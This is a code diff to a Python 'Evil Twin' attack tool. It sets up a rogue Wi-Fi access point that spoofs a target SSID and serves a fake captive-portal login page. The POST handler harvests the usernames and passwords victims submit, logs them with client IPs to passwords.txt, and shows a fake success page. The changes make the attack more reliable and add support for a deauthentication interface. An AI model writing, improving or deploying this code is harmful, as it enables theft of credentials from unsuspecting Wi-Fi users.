@@ -15,9 +15,11 @@ http_server = None
 server_thread = None
 running = False
 target_ssid = None
-cleanup_done = False  # Prevent double cleanup
+cleanup_done = False
+server_started = False  # Track if server successfully started
+deauth_interface = None  # Interface to use for deauth attacks
 
-# HTTP Handler Class (kept as class since BaseHTTPRequestHandler requires it)
+# HTTP Handler Class
 class CaptivePortalHandler(BaseHTTPRequestHandler):
     """HTTP handler for captive portal"""
     
@@ -27,17 +29,13 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
     
     def do_GET(self):
         """Serve the login page"""
-        # Check if custom HTML exists
         portal_html_path = "captive_portal/portal/index.html"
         
         if os.path.exists(portal_html_path):
-            # Read and modify the template
             with open(portal_html_path, 'r') as f:
                 html = f.read()
-            # Replace SSID placeholder
             html = html.replace('{{SSID}}', target_ssid)
         else:
-            # Use default HTML
             html = f"""
             <!DOCTYPE html>
             <html>
@@ -89,12 +87,6 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
                     button:hover {{
                         background: #45a049;
                     }}
-                    .info {{
-                        text-align: center;
-                        color: #666;
-                        font-size: 12px;
-                        margin-top: 20px;
-                    }}
                 </style>
             </head>
             <body>
@@ -106,15 +98,11 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
                         <input type="password" name="password" placeholder="Password" required>
                         <button type="submit">Sign In</button>
                     </form>
-                    <div class="info">
-                        By signing in, you agree to the terms of service
-                    </div>
                 </div>
             </body>
             </html>
             """
         
-        # Send response
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
         self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
@@ -124,7 +112,6 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
     def do_POST(self):
         """Capture credentials from POST request"""
         if self.path == '/login':
-            # Parse POST data
             content_length = int(self.headers['Content-Length'])
             post_data = self.rfile.read(content_length).decode('utf-8')
             params = parse_qs(post_data)
@@ -133,17 +120,14 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
             password = params.get('password', [''])[0]
             
             if username and password:
-                # Log credentials
                 timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                 client_ip = self.client_address[0]
                 
                 log_entry = f"[{timestamp}] SSID: {target_ssid} | IP: {client_ip} | Username: {username} | Password: {password}\n"
                 
-                # Save to passwords.txt
                 with open('passwords.txt', 'a') as f:
                     f.write(log_entry)
                 
-                # Print to console
                 print(f"\n[CAPTURED CREDENTIALS]")
                 print(f"  SSID: {target_ssid}")
                 print(f"  Username: {username}")
@@ -151,7 +135,6 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
                 print(f"  From IP: {client_ip}")
                 print("")
             
-            # Send fake success response
             response = f"""
             <!DOCTYPE html>
             <html>
@@ -193,20 +176,15 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(response.encode())
 
-# Functions (not in a class)
-
 def check_requirements():
     """Check if required files and tools exist"""
-    # Check for bash scripts
     scripts = ['captive_portal/setup_ap.sh', 'captive_portal/teardown_ap.sh']
     for script in scripts:
         if not os.path.exists(script):
             print(f"[ERROR] Missing script: {script}")
             return False
-        # Make scripts executable
         os.chmod(script, 0o755)
     
-    # Check for required tools
     tools = ['hostapd', 'dnsmasq', 'iptables']
     for tool in tools:
         result = subprocess.run(['which', tool], capture_output=True)
@@ -215,46 +193,69 @@ def check_requirements():
             print(f"Install with: sudo apt-get install {tool}")
             return False
     
-    # Create passwords.txt if it doesn't exist
     Path('passwords.txt').touch()
-    
     return True
 
 def start_web_server():
     """Start the captive portal web server"""
-    global http_server, server_thread, running
+    global http_server, server_thread, running, server_started
     
     def run_server():
-        global http_server
+        global http_server, server_started
         try:
+            # Kill any existing process on port 80 first
+            subprocess.run(['sudo', 'fuser', '-k', '80/tcp'], 
+                         stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+            time.sleep(0.5)
+            
+            # Check if the cleanup flag is already set (race condition prevention)
+            if cleanup_done:
+                print("[WARNING] Cleanup already started, not starting web server")
+                return
+            
             # Bind to 10.0.0.1:80
             http_server = HTTPServer(('10.0.0.1', 80), CaptivePortalHandler)
+            server_started = True
             print("[✓] Captive portal web server started on 10.0.0.1:80")
             
-            while running:
+            while running and not cleanup_done:
                 http_server.handle_request()
                 
         except OSError as e:
+            server_started = False
             if 'Address already in use' in str(e):
                 print("[ERROR] Port 80 is already in use")
                 print("[TIP] Try: sudo fuser -k 80/tcp")
+            elif 'Cannot assign requested address' in str(e):
+                print("[ERROR] IP 10.0.0.1 not yet configured")
             else:
                 print(f"[ERROR] Web server error: {e}")
         except Exception as e:
-            if running:  # Only show error if we're still supposed to be running
+            server_started = False
+            if running and not cleanup_done:
                 print(f"[ERROR] Web server error: {e}")
     
     print("[*] Starting captive portal web server...")
     running = True
+    server_started = False
     server_thread = threading.Thread(target=run_server, daemon=True)
     server_thread.start()
-    time.sleep(1)  # Give server time to start
+    
+    # Wait for server to start (with timeout)
+    for _ in range(10):  # Try for 5 seconds
+        if server_started:
+            return True
+        time.sleep(0.5)
+    
+    return server_started
 
 def stop_web_server():
     """Stop the web server"""
-    global running, http_server
+    global running, http_server, server_started
     
     running = False
+    server_started = False
+    
     if http_server:
         try:
             http_server.shutdown()
@@ -263,24 +264,49 @@ def stop_web_server():
     
     # Kill any process on port 80
     subprocess.run(['sudo', 'fuser', '-k', '80/tcp'], 
-                  stderr=subprocess.DEVNULL)
+                  stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+
+def disable_monitor_on_ap_interface():
+    """Disable monitor mode on wlan0 if it's in monitor mode"""
+    try:
+        # Check if wlan0 is in monitor mode
+        result = subprocess.run(['iwconfig', 'wlan0'], 
+                              capture_output=True, text=True)
+        if 'Monitor' in result.stdout:
+            print("[*] Disabling monitor mode on wlan0...")
+            subprocess.run(['sudo', 'ip', 'link', 'set', 'wlan0', 'down'], 
+                         stderr=subprocess.DEVNULL)
+            subprocess.run(['sudo', 'iw', 'dev', 'wlan0', 'set', 'type', 'managed'], 
+                         stderr=subprocess.DEVNULL)
+            subprocess.run(['sudo', 'ip', 'link', 'set', 'wlan0', 'up'], 
+                         stderr=subprocess.DEVNULL)
+            time.sleep(1)
+    except:
+        pass
 
 def run_setup_script(ssid, channel):
     """Run the bash setup script for AP"""
-    # Always use wlan0 for AP
-    ap_interface = "wlan0"
+    ap_interface = "wlan0"  # AP ALWAYS runs on wlan0
     
-    print(f"[*] Setting up fake AP on {ap_interface}...")
+    # First, ensure wlan0 is not in monitor mode
+    disable_monitor_on_ap_interface()
+    
+    # Stop channel hopping on any interface
+    print("[*] Stopping channel hopping...")
+    subprocess.run(['sudo', 'pkill', '-f', 'iwconfig.*channel'], stderr=subprocess.DEVNULL)
+    time.sleep(0.5)
+    
+    print(f"[*] Setting up fake AP on {ap_interface} (built-in NIC)...")
     setup_script = "captive_portal/setup_ap.sh"
     
     # Run setup script
     result = subprocess.run(
         ['sudo', 'bash', setup_script, ap_interface, ssid, str(channel)],
-        capture_output=False  # Show script output
+        capture_output=False
     )
     
     # Give AP time to initialize
-    time.sleep(2)
+    time.sleep(3)
     
     # Verify AP is running
     hostapd_check = subprocess.run(['pgrep', 'hostapd'], capture_output=True)
@@ -297,30 +323,31 @@ def run_setup_script(ssid, channel):
     return True
 
 def teardown_evil_twin():
-    """Stop Evil Twin and restore system - can be called multiple times safely"""
-    global cleanup_done, running
+    """Stop Evil Twin and restore system"""
+    global cleanup_done, running, server_started
     
-    # Prevent double cleanup
     if cleanup_done:
         return
     
     cleanup_done = True
     running = False
+    server_started = False
     
     print("\n[*] Cleaning up and restoring system...")
     
-    # Stop web server
+    # Stop web server first
     try:
         stop_web_server()
     except:
         pass
     
-    # Run teardown script
+    # Run teardown script with AP interface specified
     teardown_script = "captive_portal/teardown_ap.sh"
+    ap_interface = "wlan0"
     
     if os.path.exists(teardown_script):
         print("[*] Running system restore script...")
-        subprocess.run(['sudo', 'bash', teardown_script])
+        subprocess.run(['sudo', 'bash', teardown_script, ap_interface])
     else:
         print("[WARNING] Teardown script not found, doing basic cleanup...")
         subprocess.run(['sudo', 'killall', 'hostapd'], stderr=subprocess.DEVNULL)
@@ -329,39 +356,54 @@ def teardown_evil_twin():
     
     print("[✓] System restored to normal")
 
-def setup_evil_twin(monitor_iface, ssid, channel):
-    """Setup Evil Twin with fake AP and captive portal - with guaranteed cleanup"""
-    global target_ssid, cleanup_done
+def setup_evil_twin(ssid, channel):
+    """Setup Evil Twin with fake AP and captive portal
     
-    # Reset cleanup flag for new attack
+    Args:
+        ssid: Target SSID to spoof
+        channel: Channel to operate on
+        deauth_iface: Interface to use for deauth (optional)
+    
+    Note: AP always runs on wlan0
+    """
+    global target_ssid, cleanup_done, running, deauth_interface
+    
     cleanup_done = False
     target_ssid = ssid
+    
+    # AP always runs on wlan0
+    ap_interface = "wlan0"
     
     try:
         print(f"\n{'='*60}")
         print(f"    EVIL TWIN ATTACK - {ssid}")
         print(f"{'='*60}\n")
         
-        # Check requirements
         if not check_requirements():
             return False
         
-        # Note about interface usage
-        print(f"[*] Using wlan0 (built-in NIC) for fake AP")
-        print(f"[*] Monitor interface: {monitor_iface}")
+        print(f"[*] AP Interface: {ap_interface} (built-in NIC)")
         
-        if monitor_iface == "wlan0" or monitor_iface == "wlan0mon":
-            print("\n[WARNING] Monitor mode is on wlan0!")
-            print("[!] This may cause conflicts. Ensure you're using a different adapter for monitoring.")
-            print("[!] Continuing anyway...\n")
+        # Check if we have a deauth interface set
+        if deauth_interface:
+            print(f"[*] Deauth Interface: {deauth_interface}")
+            
+            if deauth_interface == ap_interface or deauth_interface == "wlan0mon":
+                print("\n[WARNING] Deauth interface conflicts with AP interface!")
+                print("[!] Deauth attacks will be limited during Evil Twin operation.")
+                print("[!] For best results, use a USB adapter for deauth.\n")
+        else:
+            print("[*] Deauth Interface: None (deauth disabled)")
         
-        # Run setup script (always uses wlan0)
+        # Setup AP (always on wlan0)
         if not run_setup_script(ssid, channel):
             print("[ERROR] Failed to setup access point")
             return False
         
-        # Start web server for captive portal
-        start_web_server()
+        # Then start web server
+        if not start_web_server():
+            print("[ERROR] Failed to start web server")
+            return False
         
         print(f"\n{'='*60}")
         print(f"[✓] Evil Twin '{ssid}' is active on wlan0!")
@@ -381,8 +423,7 @@ def setup_evil_twin(monitor_iface, ssid, channel):
         return False
         
     finally:
-        # This ALWAYS runs, even if there's an error or Ctrl+C
-        if not cleanup_done and running:
+        if not cleanup_done and not running:
             teardown_evil_twin()
 
 def stop_evil_twin():
@@ -391,18 +432,15 @@ def stop_evil_twin():
 
 def is_running():
     """Check if Evil Twin is running"""
-    return running
+    return running and server_started
 
-def quick_start(monitor_iface, bssid, ssid, channel):
+def quick_start(ssid, channel):
     """Quick start function for main script integration"""
-    # Note: bssid parameter not used but kept for compatibility
     success = False
     try:
-        success = setup_evil_twin(monitor_iface, ssid, channel)
+        success = setup_evil_twin(ssid, channel)
         return success
     finally:
-        # If setup failed, cleanup is already done in setup_evil_twin's finally block
-        # This is just for safety
         if not success and not cleanup_done:
             teardown_evil_twin()
 
